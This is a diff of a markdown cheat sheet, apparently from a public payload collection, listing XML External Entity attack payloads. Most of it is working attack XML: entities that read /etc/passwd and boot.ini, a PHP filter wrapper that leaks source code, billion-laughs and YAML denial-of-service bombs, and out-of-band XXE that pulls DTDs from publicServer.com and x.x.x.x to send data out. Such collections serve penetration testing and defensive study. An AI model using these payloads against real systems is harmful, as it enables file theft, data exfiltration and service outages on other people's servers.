@@ -1,10 +1,12 @@
 # XML External Entity
+
 An XML External Entity attack is a type of attack against an application that parses XML input
 
 ## Exploit
 
 Basic Test
-```
+
+```xml
 <!--?xml version="1.0" ?-->
 <!DOCTYPE replace [<!ENTITY example "Doe"> ]>
  <userInfo>
@@ -14,8 +16,10 @@ Basic Test
 ```
 
 ## Basic XXE
+
 Classic XXE
-```
+
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE data [
 <!ELEMENT data (#ANY)>
@@ -24,28 +28,29 @@ Classic XXE
 <data>&file;</data>
 ```
 
-```
+```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
   <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 ```
 
-```
+```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
 ```
 
-
 Classic XXE Base64 encoded
-```
+
+```xml
 <!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
 ```
 
 ## PHP Wrapper inside XXE
-```
+
+```xml
 <!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
 <contacts>
   <contact>
@@ -58,7 +63,7 @@ Classic XXE Base64 encoded
 </contacts>
 ```
 
-```
+```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
@@ -67,10 +72,11 @@ Classic XXE Base64 encoded
 <foo>&xxe;</foo>
 ```
 
-
 ## Deny of service
+
 Deny Of Service - Billion Laugh Attack
-```
+
+```xml
 <!DOCTYPE data [
 <!ENTITY a0 "dos" >
 <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
@@ -82,7 +88,8 @@ Deny Of Service - Billion Laugh Attack
 ```
 
 Yaml attack
-```
+
+```xml
 a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
 b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
 c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
@@ -95,8 +102,10 @@ i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
 ```
 
 ## Blind XXE
+
 Blind XXE
-```
+
+```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
@@ -107,9 +116,9 @@ Blind XXE
 <foo>&callhome;</foo>
 ```
 
-
 XXE OOB Attack (Yunusov, 2013)
-```
+
+```xml
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
 <data>&send;</data>
@@ -121,7 +130,8 @@ File stored on http://publicServer.com/parameterEntity_oob.dtd
 ```
 
 XXE OOB with DTD and PHP filter
-```
+
+```xml
 <?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
@@ -137,13 +147,14 @@ File stored on http://127.0.0.1/dtd.xml
 ```
 
 XXE Inside SOAP
-```
+
+```xml
 <soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
 ```
 
-
 ## Thanks to
- * https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
- * http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html
- * https://gist.github.com/staaldraad/01415b990939494879b4
- * https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870
+
+* [XML External Entity (XXE) Processing - OWASP](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
+* [Detecting and exploiting XXE in SAML Interfaces - Von Christian Mainka](http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html)
+* [staaldraad - XXE payloads](https://gist.github.com/staaldraad/01415b990939494879b4)
+* [mgeeky - XML attacks](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)
